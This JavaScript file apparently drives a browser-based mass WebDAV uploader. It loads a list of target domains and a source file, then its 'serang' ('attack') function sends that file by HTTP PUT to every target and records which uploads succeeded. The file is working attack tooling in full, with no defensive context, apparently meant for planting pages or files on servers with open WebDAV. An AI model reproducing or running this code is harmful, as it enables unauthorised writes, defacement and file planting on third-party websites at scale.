  //list function for webdav

  function adddomain() {
    var x = document.getElementById("targetlist");
    var option = document.createElement("option");
    

    let text;
    let domain = prompt("Input domain:", "http://example.com");

    option.text = addProtocol(domain);
    x.add(option);
  }

  function serang() {

    var select = document.getElementById("targetlist");
    var file = document.getElementById("filename");
    var kosong = document.getElementById("kosong");
    var berhasil = document.getElementById("berhasil");
    var result = document.getElementById("result");
    var length = select.options.length;

    result.value = ""

    if (length < 1) {
      kosong.style.display = "grid";
      beep(250);
    }else{
     for (var i = length-1; i >= 0; i--) {
      var option = select.options[i];
      webdav(option.value+"/",file.value)
      console.log(option.value);
      select.remove(i);
    }

    berhasil.style.display = "grid";
    beep(800);
  }

}

function beep(hz) {
  var context = new AudioContext();
  var oscillator = context.createOscillator();
  oscillator.type = "triangle";
  oscillator.frequency.value = hz;
  oscillator.connect(context.destination);
  oscillator.start(); 
  // Beep for 500 milliseconds
  setTimeout(function () {
    oscillator.stop();
  }, 100);
}

function loadtarget() {
    // body...
    var select = document.getElementById("targetlist");

    var input = document.getElementById("loadtarget");
    input.click();

    input.addEventListener("change", function() {

      var file = input.files[0];


      var reader = new FileReader();


      reader.readAsText(file);


      reader.onload = function() {

       var text = reader.result;

       const lines = text.split('\n');
       console.log(lines)
       select.innerHTML = "";
       for (var i = 0; i < lines.length; i++) {
        // Create a new option element
        var option = document.createElement("option");

        // Set the value and text of the option
        option.value = lines[i];
        option.text = lines[i];

        // Add the option to the select element
        select.appendChild(option);
      }

    };
  });
  }

  function loadsource() {
    var sourcedx = document.getElementById("sourcedx");

    var input = document.getElementById("loadsource");
    input.click();

    input.addEventListener("change", function() {

      var file = input.files[0];


      var reader = new FileReader();


      reader.readAsText(file);


      reader.onload = function() {

       var text = reader.result;

       sourcedx.value = text;

     };
   });
  }

  function setting() {
   var setting = document.getElementById('setting');
   var webdav = document.getElementById('webdav');

   if (setting.style.display == 'none') {
    setting.style.display = 'grid';
    webdav.style.width = '610px';
  }else{
   setting.style.display = 'none';
   webdav.style.width = '450px';
 }

}
function addProtocol(url) {
  if (!/^(https?:)?\/\//.test(url)) {
    url = 'http://' + url;
  }
  return url;
}

function webdav(urlna,filena) {
  var result = document.getElementById("result");
  var sourcedx = document.getElementById("sourcedx");
  var xhr = new XMLHttpRequest();
  xhr.open("PUT", addProtocol(urlna)+filena, true);
  xhr.setRequestHeader("Content-Type", "text/plain");
  xhr.onreadystatechange = function() {
    if (this.status === 201 || this.status === 200) {
      result.value += urlna+filena+"\n success !! \n";
    } else {

      if (this.status === 409) {
       result.value += urlna+filena+"\n Error: nama file konflik \n";
     }else{
       result.value += urlna+filena+"\n Error: "+this.status+" \n";
     }

   }
 };
 console.log(sourcedx.value)
 xhr.send(sourcedx.value);
}
function closewin(id) {
  var close = document.getElementById(id);
  close.style.display = 'none';
}
function showid(id) {
  var close = document.getElementById(id);
  close.style.display = 'grid';
}
